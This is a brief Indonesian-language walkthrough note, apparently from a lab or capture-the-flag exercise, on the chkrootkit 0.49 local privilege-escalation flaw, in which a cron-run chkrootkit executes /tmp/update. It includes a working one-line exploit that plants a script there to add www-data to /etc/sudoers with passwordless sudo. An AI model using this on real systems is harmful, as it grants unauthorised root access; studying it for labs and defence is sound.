Chkrootkit versi 0.49 memiliki celah local priv esc, jika chkrootkit ditemukan pada cron job. misalnya pada `/etc/cron.daily` maka chkrootkit ini akan selalu mengeksekusi file `/tmp/update`
Lalu kita buat exploit agar user kita saat ini jadi sudoers (bisa akses sudo)
```
echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update

```